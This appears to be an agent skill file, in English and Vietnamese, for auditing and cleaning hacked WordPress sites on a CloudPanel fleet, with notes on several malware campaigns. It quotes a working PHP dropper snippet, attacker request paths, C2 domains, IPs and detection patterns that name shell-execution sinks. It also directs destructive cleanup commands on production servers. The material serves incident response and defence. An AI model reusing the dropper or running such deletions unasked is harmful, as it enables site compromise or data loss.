---
name: wp-audit-website
description: "Audit a WordPress site on the CloudPanel fleet for hacks/malware, outage/500 health problems, and deep security vulnerabilities — then harden it. Use when a site is \"down\", \"không truy cập được\", throwing 500s, slow, suspected hacked/nhiễm mã độc/bị tấn công, or when asked to \"check/audit/scan\" a WP site, review logs, \"clean & bịt lỗ hổng\", or do a security review/pen-test. Covers: connectivity triage, PHP memory/OOM diagnosis, core+plugin checksum integrity, malware/backdoor scan, user/DB/cron injection check, nginx access-log forensics, AIOWPS + fail2ban review, hardening playbook, AND deep security audit (injection, access control, business logic, HTTP protocol, client-side, chained attacks)."
---

# WordPress Site Audit & Security Review (CloudPanel fleet)

Audit + harden any WP site on the `ssh cloudpanel` server. Three intertwined goals:
1. **Health** — why is it down / 500 / slow?
2. **Malware/IOC** — is it hacked? Clean it, patch holes.
3. **Deep Security** — source-level vulnerability hunting: injection, access control, business logic, HTTP protocol, client-side, chained attacks.

Run the scripts — do NOT type long diagnostics inline over SSH (quoting breaks). Interpret with `references/interpreting-results.md`.

## Audit modes
- **Quick audit** (default): Steps 1–7 below — IOC scan, health check, hardening. Chạy scripts trực tiếp trên server.
- **Deep security audit**: 6-phase pipeline (Recon → Hunt → Validate → Report → Structured Output → Verify). Dùng khi Sếp yêu cầu "security audit", "pen-test", "tìm lỗ hổng sâu", hoặc khi quick audit clean nhưng site vẫn bị tái nhiễm. Xem [Deep Security Audit Pipeline](#deep-security-audit-pipeline).

## Golden rules
- **Always run via uploaded scripts**, never paste multi-line `wp eval`/`grep` through `ssh '...'` — quoting/parentheses break (`unmatched '`). Pattern: `scp scripts/X.sh cloudpanel:/tmp/ && ssh cloudpanel 'bash /tmp/X.sh <domain>; rm -f /tmp/X.sh'`.
- **Read-only first.** `audit.sh` changes nothing. Only run `harden.sh` after reporting findings and getting the user's go-ahead. Hardening edits production — back up first (the script does).
- **One SSH connection knowledge:** docroot = `/home/<user>/htdocs/<domain>`, logs = `/home/<user>/logs/{nginx,php}/`, wp-cli = `sudo -u <user> wp --path=<docroot>`. The DB table prefix is NOT always `wp_` (e.g. `360_ws`) — scripts auto-detect it. Per-site PHP `memory_limit` lives in the **nginx vhost** `fastcgi_param PHP_VALUE` (~line 132 of `/etc/nginx/sites-enabled/<domain>.conf`), NOT php.ini. See `references/cloudpanel-env.md`.
- **Known-legit:** the admin account `autologin@cloudpages.cloud` is the fleet owner's own auto-login tool. Never flag it.
- **Never use `twenty*` default themes.** The fleet standard is Avada/Fusion (or a custom theme); `twentytwenty*`/`twentyten`/etc. are pure attack surface (idle code, never audited, common malware injection target). Any `twenty*` theme found inactive on a site should be removed. See Step 5.

## Workflow

### Step 1 — Triage (30s)
Confirm the symptom and that SSH works.
```
curl -sS -o /dev/null -w "HTTP %{http_code} %{time_total}s\n" -L --max-time 25 https://<domain>/
ssh cloudpanel 'echo OK; uptime'
```
500 = app error (go to memory/error-log first). 502/504 = PHP-FPM down/timeout. Connection refused/000 = nginx/DNS. 200 = intermittent — keep digging, the storm may have passed.

**BẮT BUỘC lưu trữ kết quả và dọn dẹp hệ thống (Production Hardening & Local Sync):**
1. **Lưu trữ kết quả quét (Audit logs/reports)**: Toàn bộ báo cáo và kết quả quét trung gian phát sinh từ `audit.sh` hay `audit-ioc-fleet.sh` chạy trên máy chủ CloudPanel **BẮT BUỘC chỉ được phép lưu trữ tạm thời trong thư mục `/audit-work/` trên server** (không lưu lung tung trong `/tmp/`, `/root/`, hay `/home/` khác).
2. **Lưu trữ trên máy local iMac**: Sau khi quét xong, toàn bộ các working files, backup, cấu hình và báo cáo đồng bộ về local **phải bắt buộc lưu trữ tại thư mục `/Volumes/DATA/WORDPRESS/` của máy iMac**.
3. **Dọn dẹp sau khi quét (Cleanup server artifacts)**: Ngay sau khi chạy audit xong và đồng bộ file báo cáo về máy local iMac, **phải chạy lệnh dọn dẹp (rm -rf) xóa sạch thư mục `/audit-work` trên cloudpanel**. Tuyệt đối không để lại bất kỳ dữ liệu làm việc (input/output/report/backup) nào trên máy chủ production để giữ môi trường sạch sẽ tuyệt đối.
### Step 2 — Full audit (read-only)
```
scp scripts/audit.sh cloudpanel:/tmp/ && ssh cloudpanel 'bash /tmp/audit.sh <domain>; rm -f /tmp/audit.sh'
```
This prints labelled sections: storage usage, ENV+memory, error-log/OOM, core+plugin checksums, PHP-in-uploads, recent-modified PHP, malware signatures, wp-config, dropins/mu-plugins, users, DB injection, cron, enumeration exposure, login forensics, AIOWPS, fail2ban, software versions. **Interpret every section against `references/interpreting-results.md`.** For a fleet-wide storage report, run `scripts/audit-storage.sh`.

### Step 3 — Decide verdict
- **Health:** OOM `Allowed memory size of N bytes exhausted` → memory_limit too low for the stack. A heavy stack (Avada + WooCommerce + Rank Math + AIOWPS) needs ~130MB just to boot; 128M crashes, set **512M**. Cross-check effective limit from the vhost, not php.ini.
- **Compromise:** any of — core/plugin checksum MISMATCH, PHP files in `uploads/`, malware signatures in non-vendor files, hidden admin users, `<script>`/`base64_decode` in options/posts, rogue cron hooks, successful logins from hostile IPs, **Wpanel/GreenMarca IOC patterns** (see `references/interpreting-results.md` §Wpanel campaign) → **treat as hacked**, go to `references/malware-cleanup.md`. If all clean + only *failed* logins → not breached, just normal attack noise.

### Step 4 — Act (only with user approval)
- Memory fix: edit `memory_limit=` in the vhost, `nginx -t && systemctl reload nginx`.
- Hardening: `scp scripts/harden.sh cloudpanel:/tmp/ && ssh cloudpanel 'bash /tmp/harden.sh <domain>; rm -f /tmp/harden.sh'` — tightens AIOWPS login lockdown (enables invalid-username lockout, lowers attempts, raises lockout time) with a config backup. Reversible.
- Cleanup (if hacked): follow `references/malware-cleanup.md` — reinstall core/plugins from checksums, remove injected files, reset all admin passwords + salts, force-logout, then re-run `audit.sh` to confirm clean.

### Step 5 — Remove unused `twenty*` default themes (fleet housekeeping)
The fleet never uses WordPress default themes (`twentytwenty*`, `twentyten`, …) — they only sit there as unaudited attack surface. Run fleet-wide or per-site:
```
scp scripts/remove-default-themes.sh cloudpanel:/tmp/ && ssh cloudpanel 'bash /tmp/remove-default-themes.sh; rm -f /tmp/remove-default-themes.sh'
```
Backs up every removed theme dir to `/home/cloudpanel/backups/incident/removed-default-themes-<ts>/<domain>/` before deleting (never a hard delete). If a `twenty*` theme is the **active** theme on a site, the script skips it and flags it — report that to the user instead of removing (means the site was actually using it; confirm before touching).

## Step 6 — Phân tích nội dung site dung lượng lớn (read-only)
Sau `scripts/audit-storage.sh`, không được xóa chỉ vì site vượt ngưỡng. Chạy `scripts/audit.sh <domain>` cho từng site bị đánh dấu và kiểm tra theo thứ tự:

1. Phân rã `docroot`, `wp-content`, `uploads`, `plugins`, `themes`, cache và các thư mục theo năm.
2. Tìm archive/backup/dump nằm trong docroot (`*.sql`, `*.zip`, `*.tar.gz`, `*.bak`, `*.old`) — đây là rác tiềm năng nhưng phải xác nhận trước khi xóa.
3. Tìm PHP/PHTML/PHAR trong `uploads`. Chấp nhận các guard đã biết của AIOS/BackupBuddy/iThemes và cache WPML chỉ sau khi đọc/đối chiếu đường dẫn; mọi file PHP khác phải điều tra.
4. Chạy `core verify-checksums` và `plugin verify-checksums --all`; plugin premium/nội bộ không có checksum WordPress.org thì đọc header + mã nguồn, không force-reinstall mù quáng.
5. Liệt kê admin mới, user đăng ký gần thời điểm incident và role/caps. Không xóa user chỉ vì ngày đăng ký mới; xác minh hoạt động nội dung và hỏi chủ site nếu chưa chắc.
6. Kiểm tra options/posts/cron có dấu hiệu chèn mã. `fusion_options`, `widget_text`, `wpcode_snippets`, cron của Wordfence/SEO/Redis/Avada/WPML thường là dữ liệu hợp lệ — đọc ngữ cảnh trước khi gắn nhãn.
7. Nếu public trả `403/000` nhưng upstream `127.0.0.1:8080` trả `200`, phân loại là lỗi lớp nginx/Cloudflare trước; không đổ lỗi cho WordPress hoặc thao tác dọn file.

### Quy tắc phân loại false-positive
Tên có `shell`, `locale`, `charmap`, `crypto`, `upload` hoặc `base64` không tự chứng minh malware. Cần kết hợp: vị trí file, checksum, mtime, nội dung thực thi, quyền truy cập, log request và persistence. Các PHP thường hợp lệ gồm `uploads/**/index.php` guard của plugin bảo mật/backup và cache PHP của WPML.

### Wpanel / GreenMamba campaign IOC (xác nhận trên fleet 2026-07-31)
Chiến dịch mã độc tái nhiễm fleet bằng **3 lớp persistence**: theme Avada bị cấy, plugin giả tự tạo admin, và admin backdoor hàng loạt. Quy tắc:
- **Avada persistence**: nếu `wp-content/themes/Avada/functions.php` có `WPANEL:BEGIN`, `_wp_load_compat_layer`, `class-wp-locale-data`, `wp-rewrite-rules`, `rod476/files`, `mamglaqwek.com`, `shellcode.lol` → coi là compromised. Nguồn thay thế chuẩn của fleet là `/home/vuahethong/htdocs/vuahethong.com/wp-content/themes/Avada` trên server `vuahethong`.
- **Quy trình thay Avada/plugin từ nguồn chuẩn `vuahethong.com`**: trước tiên audit source và target, kiểm tra core/plugin/theme version, checksum/hash và IOC; nếu source có IOC thì không được dùng làm nguồn. Tạo backup file + DB của target trước khi đụng production. Chỉ thay đúng `themes/Avada` và trọn bộ 4 plugin đi kèm mặc định của Avada theme (`fusion-core` - Avada Core, `fusion-builder` - Avada Builder, `fusion-white-label-branding` - Avada Branding, và `revslider` - Slider Revolution) từ source sang target, giữ nguyên `wp-config.php`, `uploads/`, database, custom child theme và dữ liệu riêng của site. Không copy toàn bộ `wp-content` hoặc cả docroot.
  
  Sau khi copy theme và plugin, bắt buộc chạy lệnh cập nhật database của WordPress và Avada (nếu có) thông qua WP-CLI:
  ```
  sudo -u <user> wp --path=<docroot> core update-db
  ```
  Tiếp tục kiểm tra tính toàn vẹn và cấu hình, sửa owner/permission theo user site, xóa OPcache/reload PHP-FPM nếu cần. Cuối cùng, chạy `core verify-checksums`/plugin checksum, quét IOC lần nữa và thực hiện kiểm tra HTTP 200 đảm bảo website hoạt động ổn định và không bị lỗi 500 hay lỗi kết nối. Nếu phiên bản source khác target, ưu tiên bản cùng phiên bản; nếu không có, ghi rõ thay đổi phiên bản và kiểm tra tương thích trước khi reload.
- **Plugin giả tạo admin**: `wp-content/plugins/wordpress-cache-optimizer/wordpress-cache-optimizer.php` là root-cause đã xác nhận. Nó tự tạo/ẩn/chống xóa admin `wphiddenbot` (`wphiddenbot@gmail.com`) bằng `wp_insert_user`, `pre_user_query`, `delete_user`. Khi thấy file này: backup DB + quarantine plugin trước, rồi xóa đúng user `wphiddenbot` bằng SQL chính xác; không dùng `wp user delete --user_login=...` vì WP-CLI không filter như mong đợi.
- **Fake remote-payload plugin**: `wp-content/mu-plugins/wp-fixplugin.php` tự inject JavaScript từ `mamglaqwek.com` và expose REST route công khai để đổi payload. Hash đã gặp: `5fc9c8ad0dc156ec505f498c1ddde259fe413a115dbd1f12bb8e6d188d37eca6`.
- **AIOWPS/theme language inject**: mọi `PHPLoader.php` có hash `49e6516d20bff05169e6c97f1f3e6862991bfd548ccbe9204fd7baceea9fdad3` là backdoor Wpanel, kể cả nằm dưới AIOWPS `languages/`, Avada `languages/`, `licensing/`, `tribe/`, hoặc `wp-content/maintenance/assets/`. File `.htaccess` kèm trong `languages/` cũng phải quarantine.
- **Dropin/webshell/persistence cũ**: `wp-content/db.php`, `wp-admin/images/T04s1/wp-load.php` (`GhostManSec`), `wp-content/languages/themes/the/plugins.php`, `wp-content/plugins/wp-compat` 1.3.3, `mu-plugins/site-compat-layer.php`, `wp-compat-layer.php`, `sso-loader.php`, `wp-rewrite-rules.php`, `mu-plugins/index.php` có `eval()` đều là compromised.
- **Disguised mu-plugins directory (MANDATORY REMOVAL)**: Thư mục `mu-plugins` CHỈ ĐƯỢC PHÉP tồn tại duy nhất ở đường dẫn chuẩn là `/wp-content/mu-plugins/`. Bất kỳ thư mục nào khác có tên là `mu-plugins` ở bất kỳ vị trí nào khác trong website (ví dụ `wp-content/plugins/mu-plugins`, `wp-admin/mu-plugins`, `wp-includes/mu-plugins`, thư mục `/mu-plugins/` ngay tại root website, v.v.) đều là ngụy trang độc hại của virus. Phải cô lập và xóa bỏ hoàn toàn mà không cần giữ lại.
- **`upgrade-temp-backup` folder (WP Rollback feature)**: Đây là thư mục hợp lệ do WordPress sinh ra khi cập nhật lỗi/gián đoạn. Không cần xóa cả thư mục nếu nó trống, nhưng nếu chứa file `.php` lạ mà không có hoạt động cập nhật gần đây thì phải điều tra và dọn dẹp các file php đó.
- **`wp2shell-single-point-mitigation.php`**: nội dung có thể giống rule chặn REST batch, nhưng theo chính sách fleet của chủ server, tên file này vẫn là IOC cần quarantine trừ khi có xác nhận rõ là do đội vận hành cài.
- **Admin backdoor pattern chắc chắn**: user/email có `w2s_`, `wp2_`, `wp2s_`, `Nx_`, `JLG_`, `Bunk_`, `bunk_`, `bl_`, `svc_`, `wordpress_<hex>`, `wp_admin_`, `wphiddenbot`, `seomanager2026`, `cron_service`, `wpchecking`, `adminbockup`, `upgrades`, hoặc domain email `wp2shell`, `shellcode.lol`, `nx.invalid`, `bunk.invalid`, `bl.bl`, `mailtest.invalid`, `local.invalid`, `local.host` → backup DB rồi xóa. `autologin@cloudpages.cloud` là hợp lệ, không flag.
- **Log pattern**: batch REST API (`wp-json/batch/v1`, `rest_route=/batch/v1`) trả 200/207/301 với payload lớn, `shell` probe (`alfa`, `wso`, `filemanager`, `cmd.php`) trả 200, admin mới quanh 2026-07-19..31 là dấu hiệu cần truy root-cause. 403/404 chỉ là attempted scan, không đủ kết luận nhiễm nếu không có file/user/DB IOC.
- **Bài học 2026-07-31**: xóa file mà không xóa root-cause (`wordpress-cache-optimizer` hoặc Avada persistence) sẽ làm admin/file tự mọc lại trong vài giây. Luôn quarantine root-cause trước, rồi mới xóa user/file.

### NXDROP / 2DUAN / hostinger-cache campaign (xác nhận trên fleet 2026-08-06 → 2026-08-09)
Chiến dịch mới, **khác hoàn toàn** Wpanel/GreenMamba. Lây qua **2 vector độc lập**:

#### Vector 1 — AIOS Backup directory RCE (`138.229.96.224`)
IP `138.229.96.224` khai thác backdoor được cài sẵn trong AIOS backup directory:
```
POST /wp-content/plugins/all-in-one-wp-security-and-firewall/backups/backups/index.php
POST /wp-includes/blocks/comment-template/comment-template/seo-plugin.php
```
Cả hai path trả HTTP 200 → backdoor còn active, không phải probe thất bại. File `index.php` trong `backups/backups/` là **dropper đã cài từ đợt nhiễm trước**, không phải file gốc AIOS. File `seo-plugin.php` trong `wp-includes/blocks/` là **rogue file cài vào WP core directory**. Đây là **root-cause tái nhiễm**: cleanup chỉ xóa plugin giả nhưng không xóa 2 backdoor này → chúng tái cài plugin giả mỗi lần chạy.

**IOC bắt buộc kiểm tra và xóa:**
- `/wp-content/plugins/all-in-one-wp-security-and-firewall/backups/backups/index.php` — chỉ hợp lệ nếu là `<?php // Silence is golden.` (1 dòng), bất kỳ nội dung nào khác = backdoor
- `/wp-includes/blocks/**/seo-plugin.php` — không bao giờ hợp lệ, luôn là rogue
- `/wp-includes/QZKy/zDGbLd/zDGbLd/ponjagvXDqumTRwLxk.bmp` — webshell obfuscated PHP decrypt POST payload rồi eval()
- `/wp-content/plugins/neoncore-themes/O/UID69.php` — webshell đã xác nhận

**Pattern tham số dropper:**
```
?r=<base64 danh sách path>&s=<int>&d=<int>&x=<token>
```
Nếu thấy POST vào bất kỳ `.php` nào với tham số `r=`, `s=`, `d=`, `x=` đồng thời → là dropper RCE đang hoạt động.

#### Vector 2 — NXDROP plugin giả (tái cài bởi Vector 1)
Plugin giả có tên giả dạng hệ thống: `database-repair-assistant-<hex>`, `widget-accessibility-helper-<hex>`, `content-delivery-helper-<hex>`, `advanced-cache-handler-<hex>`, `site-performance-toolkit-<hex>`, `wp-hc-<hex>`. Mỗi plugin chứa 2 file:
- `functions.php` — NXDROP dropper: nhận POST base64 → ghi thêm file `objcache-<random>.php`
- `index.php` — `<?php // Silence is golden.`

Payload `functions.php`:
```php
if(isset($_GET['_nxd']) && isset($_POST['d']) && hash_equals('<token>', $_GET['_nxd'])){
    file_put_contents(__DIR__.'/objcache-<random>.php', base64_decode($_POST['d']));
}
```
Mỗi site có token `_nxd` riêng → campaign tập trung, có C2 quản lý.

#### Vector 3 — hostinger-cache.php persistent injector (caoocviet.vn)
`wp-content/mu-plugins/hostinger-cache.php` giả danh "Object Cache Drop-in Helper", chạy **cron mỗi 30 giây**, prepend hex2bin payload vào `root index.php`. Khi bị cài, `index.php` sẽ có block:
```
// 2DUAN_START
// __B26_2DUAN_WP_INLINE_GUARD_MK_v2__
```
Payload decode ra SEO doorway gọi về C2 `4208-ra-i5-1.50yg.klm` (ROT13). **Nguy hiểm nhất**: xóa mu-plugin không đủ — phải strip phần inject khỏi `index.php` thủ công.

**Strip 2DUAN khỏi index.php:**
```bash
# Backup trước
cp index.php index.php.bak-$(date +%s)
# Lấy phần sạch sau block 2DUAN_END
sed -n '/\/\/ 2DUAN_END/,$ p' index.php | sed '1d' > index.php.clean
mv index.php.clean index.php
```

**mtime tái nhiễm:** plugin giả tái xuất hiện 2026-08-06 15:56 → 2026-08-08 21:09, chứng tỏ Vector 1 (backdoor AIOS/seo-plugin.php) còn active sau cleanup 28/7.

**Sites bị nhiễm đợt này:** `annails.net`, `apds-vn.com`, `caoocviet.vn`, `dietcontrungvungtau.com`, `duchuynhcrane.com`, `dulichthuyvan.com`, `hailaspa.com`, `namtienmc.com`

**Cleanup bắt buộc theo thứ tự — không bỏ bước:**
1. Xóa `backups/backups/index.php` (backdoor AIOS) và `seo-plugin.php` trong `wp-includes/blocks/`
2. Xóa các thư mục và file lạ dạng obfuscated PHP ẩn dưới đuôi ảnh giả trong core directory (ví dụ `/wp-includes/QZKy/`, `/wp-includes/IqT/`, `/wp-includes/LNWwOaFM/`, `/wp-includes/Iqt/`)
3. Xóa `neoncore-themes` nếu tồn tại
4. Quarantine tất cả plugin giả `wp-hc-*`, `database-repair-*`, `widget-accessibility-*`, `content-delivery-*`, `advanced-cache-handler-*`, `site-performance-toolkit-*`
5. Quarantine `hostinger-cache.php` trong mu-plugins
6. Strip `// 2DUAN_START ... // 2DUAN_END` khỏi `index.php` nếu có
7. Chạy lại `audit-ioc-fleet.sh` để xác nhận sạch
8. Chặn IP `138.229.96.224`, `38.175.103.97`, `147.53.121.195` ở firewall/fail2ban
- **Bài học 2026-08-07 (Mã độc rải rác ngoài docroot)**: malware có thể nhân bản các file PHP độc hại giả danh core (như `wp-blog-header.php` hoặc `wp-cron.php`) ra toàn bộ các thư mục của user ngoài docroot (`/home/<user>/backups/`, `/home/<user>/logs/`, `/home/<user>/tmp/`, `/home/<user>/htdocs/`). Đây là backdoor RCE kết nối C2 (`hubnode.gamerspe.top`). Bắt buộc tìm và xóa sạch các file này ngoài docroot chuẩn.
- **Theme level .htaccess injection (2026-08-07)**: malware cài cấy file `.htaccess` độc hại vào `/wp-content/themes/.htaccess` để chặn thực thi mọi file PHP ngoại trừ webshell duy nhất của chúng (ví dụ: `ttvoTifYBj.php`). Bắt buộc xóa bỏ các file `.htaccess` nằm trong thư mục themes.
- **Rogue .htaccess Whitelist (2026-08-07)**: malware chèn cấu hình `Allow from all` cho các file PHP độc hại/fake core (`wp-logln.php`, `wp-admnn.php`, `wp-conffq.php`, `reviall.php`, v.v.) trong file `.htaccess` tại root hoặc `/wp-content/.htaccess` để tự bảo vệ webshell. Bắt buộc khôi phục `.htaccess` chuẩn, xóa whitelist độc hại và đặt thuộc tính bảo mật `chattr +i` cho file `.htaccess` ở root.
- **Rogue .htaccess in User Logs Directory (2026-08-07)**: malware cấy file `.htaccess` có cấu hình WordPress URL rewrite giả lập vào thư mục logs của hệ thống (`/home/<user>/logs/`, `/home/<user>/logs/php/`, v.v.) để hijack hoặc đánh lừa hệ thống. Thư mục logs mặc định không bao giờ chứa file `.htaccess`. Phải tìm và xóa bỏ hoàn toàn.
- **Remove Default WordPress Info Files (2026-08-07)**: Bắt buộc xóa bỏ các file thông tin mặc định của WordPress như `readme.html`, `license.txt`, `licencia.txt` ở root và trong `wp-includes/` để tránh lộ thông tin phiên bản và giảm thiểu vector quét lỗ hổng từ tin tặc.
- **Unauthorized folder 'image' (2026-08-07)**: cấu trúc thư mục WordPress chuẩn tuyệt đối không được phép có thư mục nào tên là `image` (hoặc `images`) nằm ngay tại thư mục root website. Sự tồn tại của thư mục này là bất thường, do malware tạo ra để lưu trữ webshell/tàn dư code php độc hại (`app.php.bak`, `.b26_sed_bak/`). Phải cô lập và xóa bỏ hoàn toàn thư mục này.
- **WordPress Fleet Custom 7.0 (2026-08-07)**: fleet có thể chạy bản dựng nội bộ được đánh dấu là `7.0` (tích hợp API custom như `abilities.php`, `ai-client.php`, `class-wp-connector-registry.php`). Hãy xác minh phiên bản WordPress trước khi kết luận các file này là mã độc; không force-download core WordPress từ wordpress.org nếu nó ghi đè mất code custom của fleet.
- **DB Password Rotation (CloudPanel v2)**: lệnh `clpctl db:update:password` không khả dụng. Để đổi mật khẩu database, dùng MySQL root thực thi SQL `ALTER USER 'username'@'%' IDENTIFIED BY 'new_password'; FLUSH PRIVILEGES;` (sau khi dò host của user trong `mysql.user`), rồi cập nhật file `wp-config.php` (lưu ý chạy `sudo chattr -i` trước và `sudo chattr +i` sau khi đổi).

### W2S Webshell + ANTIGRAVITY MAILER campaign (xác nhận trên fleet 2026-08-10)
Chiến dịch **WP2Shell** automated attack qua REST API Batch endpoint, phát hiện trên `caoocviet.vn` và `namanhvublast.com`.

#### Attack vector
1. Attacker gửi `POST /?rest_route=/batch/v1` tạo admin user mới (User-Agent: `wp2shell`)
2. Login bằng admin mới → upload webshell plugins qua WP plugin upload
3. Webshell đăng ký REST routes `permission_callback: __return_true` → open backdoor
4. Cài thêm ANTIGRAVITY MAILER để spam, phishing theme để host phishing

#### Webshell plugin IOC patterns
- Plugin names: `site-tweaks-<hex>`, `admin-utils-<hex>`, `core-helper-<hex>`, `wp-optimizer-<hex>`, `wp-cache-<hex>`
- REST routes: `register_rest_route('wputils/v1', '/<random_hex>', ...)` với `permission_callback: __return_true`
- Auth token: `hash_equals('<token>', $_GET['t'])` hoặc `define('SECRET_KEY_XXXX', '<md5>')`
- Execution chain: `shell_exec → exec → system → passthru → proc_open` hoặc `eval()`
- File pattern: `w2sd_run()`, `w2s_run($c, $mode)`, `WordPress_Option_Cache_Handler` class

#### ANTIGRAVITY MAILER v3.1 (plugin `wp2_b9vic3`)
- Dual-mode mailer: individual loop + BCC
- PDF attachment support
- File `antigravity.php` trong thư mục plugin giả

#### CGI backdoor
- `eni_cgi/eni.sh` với `AddHandler cgi-script .sh` + `Options +ExecCGI`

#### Phishing theme
- Theme `dlnojok` chứa: `about.php`, `autowppass.php`, `prom.php`, `prosell2.php`, `rcc9.php`, `xl9.php`, `xs.php`

#### index.php SEO doorway injection
Payload obfuscated base64 prepend vào `index.php`, C2 callback tới `h6vbsycb.qqflvm.shop`. Dấu hiệu: `index.php` > 1KB, chứa `$a="ba";$b=...;$u=$a.$c.$i.$t."_d".$i."cod".$i;` pattern.

#### .htaccess whitelist backdoor
Malware thêm `FilesMatch` whitelist cho fake filenames: `wp-logln.php`, `wp-admnn.php`, `wp-conffq.php`, `wp-lock.php`, `wp-temp.php`, `wp-headre.php`, `reviall.php`. Phải clean .htaccess thủ công.

#### Attacker IPs (W2S campaign)
- `185.61.223.156` (User-Agent: `wp2shell`)
- `185.111.159.106` (User-Agent: `wp2shell`)
- `104.28.159.125`
- `93.123.109.163`
- `149.102.233.44`

#### Cleanup bắt buộc
1. Quarantine tất cả plugin `site-tweaks-*`, `admin-utils-*`, `core-helper-*`, `wp-optimizer-*`, `wp-cache-*`, `wp2_b9vic3`
2. Xóa theme `dlnojok`, thư mục `eni_cgi`
3. Xóa fake admin users (pattern dòng 93)
4. Clean `index.php` — replace bằng WP stock (`define('WP_USE_THEMES', true); require __DIR__ . '/wp-blog-header.php';`)
5. Clean `.htaccess` — xóa whitelist backdoor filenames
6. Reset WP salts: `wp config shuffle-salts` (nhớ `chattr -i` trước, `+i` sau)
7. Core reinstall: `wp core download --version=<ver> --force --skip-content`
8. Verify: `wp core verify-checksums`
9. Hardening: `chattr +i index.php wp-config.php .htaccess`, block PHP in uploads
10. Block attacker IPs ở firewall

### Step 7 — Kiểm tra cây `htdocs` và SEO doorway (fleet hardening)
CloudPanel chuẩn dùng duy nhất `/home/<user>/htdocs/<client-domain.com>` làm docroot. Các cây sau là bất thường, không được coi là website hợp lệ nếu không có vhost xác nhận rõ ràng:

- `/home/<user>/htdocs/public_html`
- `/home/<user>/htdocs/public_html/public_html`
- `/home/<user>/htdocs/wp-content`
- `/home/<user>/htdocs/wp-contents`
- `/home/<user>/htdocs/app` (chỉ hợp lệ với site ứng dụng đã biết)

Đối chiếu `root` trong `/etc/nginx/sites-enabled/*.conf` và `root` trong PHP-FPM pool trước khi xử lý. Nếu cây không được vhost tham chiếu, quarantine cả cây sau khi ghi nhận `stat`, hash và mốc thời gian; không xóa mù. Chạy audit fleet bằng `scripts/audit-invalid-htdocs.sh`.

Tìm doorway HTML mới sinh ngoài WordPress, đặc biệt các thư mục chứa `index.html` khoảng vài trăm KB, title/URL kiểu cờ bạc hoặc nội dung không liên quan site (`MAXWIN`, `PANEN`, `MAHJONG`, `galery88.art`, `agent2-pemenang.pages.dev`). Đối chiếu mtime với access log.

`POST /shell.php` kèm tham số `_r=<đường dẫn docroot>` hoặc `e=<đường dẫn file đích>` là bằng chứng webshell đã ghi file, không phải request WordPress bình thường. Khi thấy pattern này:

1. Cô lập endpoint/root-cause trước.
2. Lưu log và hash làm evidence.
3. Quarantine doorway HTML, sitemap giả, verification file và cây `public_html` không hợp lệ.
4. Kiểm tra user/admin, cron, mu-plugin, drop-in, core/plugin checksum và scan lại sau cleanup.
5. Không xóa `wp-includes/Text/Diff/Engine/shell.php` chỉ vì tên `shell.php`; đó là file core hợp lệ nếu checksum PASS. Phân biệt theo đường dẫn, nội dung và log.

### Dấu hiệu cần ưu tiên xử lý
- Core checksum fail ngoài các file tài liệu bị thiếu có chủ ý.
- Plugin `.org` checksum fail; plugin nội bộ checksum fail phải đọc mã trước khi quyết định.
- PHP/PHTML/PHAR lạ trong `uploads`, mu-plugin/drop-in không giải thích được.
- Admin mới không xác định được chủ sở hữu, đặc biệt kèm bài viết/nội dung hoặc login bất thường.
- Public 403/502/000 nhưng upstream khác trạng thái.
- WP-CLI fatal, PHP error liên tục, hoặc site đang chạy core/plugin quá cũ.
- `root` của vhost không khớp `/home/<user>/htdocs/<domain>` hoặc có cây `public_html` ngoài vhost.
- `POST /shell.php` có `_r`/`e`, doorway HTML hàng loạt, title spam hoặc link domain lạ.

## Deliverable
Report in Markdown (user prefers .md): symptom → root cause → evidence table (checks passed/failed) → storage breakdown → attack summary (attempted vs succeeded) → actions taken → remaining recommendations. Be direct; quote the decisive log lines and state explicitly when a finding is only a review flag, not proof of compromise.

---

## Deep Security Audit Pipeline

Dùng khi cần audit source-level vulnerabilities (không chỉ IOC/malware). Quy trình 6 phase, mỗi phase adversarial với phase trước.

### Phase 1 — Reconnaissance (hiểu trước, hunt sau)

Trước khi tìm bug, map architecture. Launch **3 research agents song song**:

**Agent 1a — Overview & tech stack:**
```
Explore WP site at <docroot>. Answer:
1. WP version, PHP version, active theme, active plugins (tên + version)
2. Deployment: CloudPanel, Cloudflare? CDN? Caching layer?
3. Key entry points: REST API enabled? Custom endpoints? WooCommerce? Membership plugin?
4. Directory structure: custom uploads path? mu-plugins? drop-ins?
Return specific file paths for key entry points.
```

**Agent 1b — Trust boundaries & access control:**
```
Explore WP site at <docroot>. Find ALL code related to:
1. Trust boundaries: HTTP requests, file uploads, REST API, AJAX, cron, webhooks
2. Authentication: wp_login, cookie auth, JWT plugins, application passwords, OAuth
3. Authorization: current_user_can(), permission_callback(), capability checks
4. Privilege separation: code run as root? wp-cli user? Custom roles?
5. Bypass mechanisms: debug flags, dev-only modes, backdoor patterns
Return trust model: actors, what each can do, which code enforces it. File paths + line numbers.
```

**Agent 1c — Input surface inventory:**
```
Explore WP site at <docroot>. Produce complete inventory:
1. Network surfaces: REST endpoints, AJAX actions (wp_ajax_*, wp_ajax_nopriv_*), XML-RPC, pingback, cron URLs
2. File input: upload handlers, import, config parsing
3. User-generated content: post content, comments, meta, options stored + later rendered
4. External integrations: OAuth, webhooks, third-party APIs, shortcodes
5. Dangerous sinks: wpdb->query, echo, print, eval, shell_exec, include, file_put_contents
Return specific file paths. Be exhaustive.
```

Tổng hợp → `architecture.md`. Inject verbatim vào mọi Phase 2 agent prompt.

### Phase 2 — Vulnerability Hunt

Launch **6–10 agents song song** (nhiều hơn với site lớn/phức tạp). Mỗi agent nhận architecture summary + attack class + file paths + hunting methodology.

**Hunting methodology** (inject vào mọi agent — xem đầy đủ tại `references/hunting-methodology.md`):
- Tấn công sad path, không chỉ happy path
- Follow data qua mọi layer — từ entry point qua validation, transformation, storage, retrieval, output
- Spawn sub-agents khi cần đào sâu vào subsystem cụ thể
- Xem attack classes đầy đủ tại `references/attack-classes.md`

**Phân bổ agents theo site type:**
- **Blog/brochure**: Injection (core), Access Control, Obvious Things, Client-side, Wildcard
- **WooCommerce**: + Business Logic (price/coupon/order), Feature Abuse (export/import), Chained Attacks
- **Membership/LMS**: + Access Control (per-item), Feature Abuse (course/content access), Auth Protocol
- **Multi-site**: + Access Control (cross-site), Trust Boundaries (network admin vs site admin)

**Attack class assignments:**
1. **Injection** — SQL via `$wpdb`, XSS via `echo`, shell via `exec`, file path via `include`
2. **Access Control** — REST `permission_callback`, AJAX nonces, capability checks, bulk operations
3. **Resource & File Handling** — upload bypass, path traversal, SSRF via `wp_remote_get`
4. **Cryptography & Secrets** — nonces, salts, hardcoded keys, reset tokens
5. **Business Logic** — state machine, race conditions, numeric manipulation, WooCommerce flows
